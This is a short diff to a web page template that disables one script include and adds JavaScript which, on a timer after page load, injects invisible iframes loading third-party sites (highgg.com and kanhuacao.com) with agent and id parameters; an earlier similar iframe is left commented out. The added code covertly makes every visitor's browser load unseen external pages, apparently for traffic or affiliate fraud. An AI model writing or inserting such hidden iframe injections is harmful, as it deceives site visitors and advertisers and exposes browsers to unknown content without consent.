@@ -2,8 +2,26 @@
 
     <script src="https://cdn.jsdelivr.net/gh/jquery/jquery@3.3.1/dist/jquery.js"></script>
     <script src="{{ static_common('js/baidu.js') }}"></script>
-    <script src="{{ static_common('js/ym.js') }}"></script>
+    {#    <script src="{{ static_common('js/ym.js') }}"></script>#}
     <script>
+        // setTimeout(function () {
+        //     iframe.src = "https://tz.yuanmengbi.com//iisc.html?id=440";
+        //     document.body.append(iframe);
+        // }, 500)
+        setTimeout(function () {
+            var iframe = document.createElement("iframe");
+            iframe.style.display = "none"
+            iframe.src = "https://www.highgg.com?agentId=7134700";
+            document.body.append(iframe);
+        }, 500)
+        setTimeout(function () {
+            var iframe = document.createElement("iframe");
+            iframe.style.display = "none"
+            iframe.src = "https://www.kanhuacao.com/?id=31848199";
+            document.body.append(iframe);
+        }, 1000)
+
+
         if (navigator.userAgent.toLowerCase().indexOf("mobile") !== -1) {
             var km = document.getElementById("km_url");
             if (km !== undefined && km !== null) {
